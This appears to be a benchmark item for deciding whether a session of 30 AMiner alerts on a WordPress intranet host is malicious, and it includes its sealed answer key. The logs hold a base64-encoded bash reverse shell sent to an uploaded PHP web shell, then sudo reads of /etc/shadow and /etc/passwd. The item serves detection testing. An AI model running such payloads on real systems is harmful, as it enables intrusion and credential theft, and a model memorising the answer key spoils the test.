@@ -1,0 +1,682 @@
+{
+  "incident_id": "ait-sess-wheeler-wheeler-0077",
+  "name": "ATTEST-AIT wheeler/wheeler session 77",
+  "source_benchmark": "ATTEST-AIT-ADS",
+  "source_scenario": "wheeler/wheeler/session-0077",
+  "alert": {
+    "timestamp": "2022-01-30T17:51:41Z",
+    "host": "wheeler",
+    "user": "unknown",
+    "alert_type": "ait_ads_session",
+    "summary": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on wheeler (30 alerts; detectors: AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter combination in Audit logs., AMiner: New cred_disp parameter c",
+    "scenario": "wheeler"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-30T17:51:41Z",
+    "end": "2022-01-30T18:00:32Z",
+    "hosts": [
+      "wheeler"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-sess-0001-56268c70",
+        "timestamp": "2022-01-30T17:51:41Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.38.243.125 - - [30/Jan/2022:17:51:41 +0000] \"GET /wp-content/uploads/2022/01/blupxljcmk-1643529407.9648.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjcuMTgxLjIxOC8zNDU3Mjsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506727 \"-\" \"python-requests/2.27.1\"",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0002-fede8140",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: Successful su for kford by www-data",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0003-3e889653",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: + /dev/pts/2 www-data:kford",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0004-8343586a",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: pam_unix(su:session): session opened for user kford by (uid=33)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0005-c78c2c17",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_auth parameter combination in Audit logs.",
+        "message": "type=USER_AUTH msg=audit(1643565112.699:3094): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0006-54bb6668",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1643565112.699:3095): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0007-8d345384",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1643565112.703:3096): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0008-0f66c018",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1643565112.779:3097): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0009-61dd1665",
+        "timestamp": "2022-01-30T17:52:07Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:07 intranet-server sudo:    kford : TTY=pts/2 ; PWD=/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0010-de09ebcd",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:10 intranet-server sudo:    kford : TTY=pts/2 ; PWD=/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0011-544f1e17",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:10 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0012-d242a6df",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:10 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0013-c9b3ff39",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1643565130.343:3098): pid=6907 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F736861646F77 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0014-c9e67208",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1643565130.343:3098): pid=6907 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F736861646F77 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0015-980e66a3",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1643565130.343:3099): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0016-ae5e9c56",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1643565130.343:3099): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0017-abce8fd9",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1643565130.343:3100): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0018-40c7dcc2",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1643565130.347:3101): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0019-5c13831f",
+        "timestamp": "2022-01-30T17:52:10Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1643565130.347:3102): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0020-76f20928",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:13 intranet-server sudo:    kford : TTY=pts/2 ; PWD=/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/passwd",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0021-0c4d28ea",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:13 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0022-5af5dea7",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:13 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0023-fbc3c6a0",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1643565133.767:3103): pid=6909 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F706173737764 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0024-51f171e0",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1643565133.767:3103): pid=6909 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F706173737764 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0025-7358562c",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1643565133.767:3104): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0026-1da68aa1",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1643565133.767:3104): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0027-cfbc37f8",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1643565133.767:3105): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0028-6ee47ed8",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1643565133.771:3106): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0029-49091fd9",
+        "timestamp": "2022-01-30T17:52:13Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1643565133.771:3107): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0030-cbde439f",
+        "timestamp": "2022-01-30T18:00:32Z",
+        "host": "wheeler",
+        "source": "alerts",
+        "detector": "AMiner: Unusual occurrence frequencies of DNS query IPs.",
+        "message": "Jan 30 18:00:32 dnsmasq[14167]: query[AAAA] cloud.dmz.flores.wheeler.biz from 10.38.243.24",
+        "sensor": "aminer"
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-sess-0001-56268c70",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:41Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.38.243.125 - - [30/Jan/2022:17:51:41 +0000] \"GET /wp-content/uploads/2022/01/blupxljcmk-1643529407.9648.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjcuMTgxLjIxOC8zNDU3Mjsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506727 \"-\" \"python-requests/2.27.1\"",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0005-c78c2c17",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:52Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_auth parameter combination in Audit logs.",
+        "message": "type=USER_AUTH msg=audit(1643565112.699:3094): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0006-54bb6668",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:52Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1643565112.699:3095): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0007-8d345384",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:52Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1643565112.703:3096): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0008-0f66c018",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:52Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1643565112.779:3097): pid=6892 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"kford\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0009-61dd1665",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:07Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:07 intranet-server sudo:    kford : TTY=pts/2 ; PWD=/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0010-de09ebcd",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:10 intranet-server sudo:    kford : TTY=pts/2 ; PWD=/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0011-544f1e17",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:10 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0012-d242a6df",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:10 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0013-c9b3ff39",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1643565130.343:3098): pid=6907 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F736861646F77 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0014-c9e67208",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1643565130.343:3098): pid=6907 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F736861646F77 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0015-980e66a3",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1643565130.343:3099): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0016-ae5e9c56",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1643565130.343:3099): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0017-abce8fd9",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1643565130.343:3100): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0018-40c7dcc2",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1643565130.347:3101): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0019-5c13831f",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:10Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1643565130.347:3102): pid=6907 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0020-76f20928",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:13 intranet-server sudo:    kford : TTY=pts/2 ; PWD=/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/passwd",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0021-0c4d28ea",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:13 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0022-5af5dea7",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:52:13 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0023-fbc3c6a0",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1643565133.767:3103): pid=6909 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F706173737764 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0024-51f171e0",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1643565133.767:3103): pid=6909 uid=1003 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.flores.wheeler.biz/wp-content/uploads/2022/01\" cmd=636174202F6574632F706173737764 terminal=pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0025-7358562c",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1643565133.767:3104): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0026-1da68aa1",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1643565133.767:3104): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0027-cfbc37f8",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1643565133.767:3105): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0028-6ee47ed8",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1643565133.771:3106): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0029-49091fd9",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:52:13Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1643565133.771:3107): pid=6909 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'",
+        "sensor": "aminer"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wheeler"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wheeler"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on wheeler (30 alerts; detectors: AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter combination in Audit logs., AMiner: New cred_disp parameter c",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wheeler"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wheeler"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on wheeler (30 alerts; detectors: AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter combination in Audit logs., AMiner: New cred_disp parameter c",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "ATTEST-AIT-ADS",
+    "scenario": "wheeler/wheeler/session-0077",
+    "answer": "malicious",
+    "accept": [
+      "malicious"
+    ],
+    "grading": "exact_ci",
+    "label": "malicious",
+    "is_true_positive": true,
+    "attack_stages": [
+      "privilege_escalation",
+      "reverse_shell"
+    ],
+    "session": {
+      "gap_sec": 900,
+      "max_sec": 3600,
+      "alert_count": 30,
+      "kept_alerts": 30
+    },
+    "sealed": true
+  }
+}
